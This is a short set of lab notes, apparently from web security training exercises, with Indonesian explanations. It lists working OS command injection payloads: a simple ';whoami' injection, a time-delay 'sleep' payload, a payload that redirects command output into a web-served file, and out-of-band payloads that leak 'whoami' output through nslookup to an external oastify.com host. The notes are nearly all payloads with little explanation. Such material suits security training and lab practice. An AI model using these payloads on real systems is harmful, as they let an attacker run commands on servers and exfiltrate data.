### OS command injection, simple case

**Payload** : `productId=1&storeId=1;whoami`

### Blind OS command injection with time delays

**Payload** : `name=a&email=abcd%40gmail.com%26sleep+10%26&subject=adfa&message=adsf`
**Penjelasan** : 
Dengan mencoba pada setiap parameter yang ada dengan operator AND `%26`, maka terdapat error ketika dicoba pada parameter `email`

### Blind OS command injection with output redirection

**Payload** : `name=a&email=abcd%40gmail.com%26whoami+>+/var/www/images/whoami.txt+%26&subject=adfa&message=adaf`
**Penjelasan** : 
Dengan memasukan hasil output dari command ke dalam suatu file `/var/www/images/whoami.txt`, dan membukanya pada path `/image?filename=whoami.txt`

### Blind OS command injection with out-of-band interaction
**Payload** :
```
asdf%40gmail.com||nslookup+`whoami`.7iqb3g587y8c0oz1du27od0y2p8gw8kx.oastify.com
```

### Blind OS command injection with out-of-band data exfiltration
**Payload** :
```
asdf%40gmail.com||nslookup+`whoami`.7iqb3g587y8c0oz1du27od0y2p8gw8kx.oastify.com
```

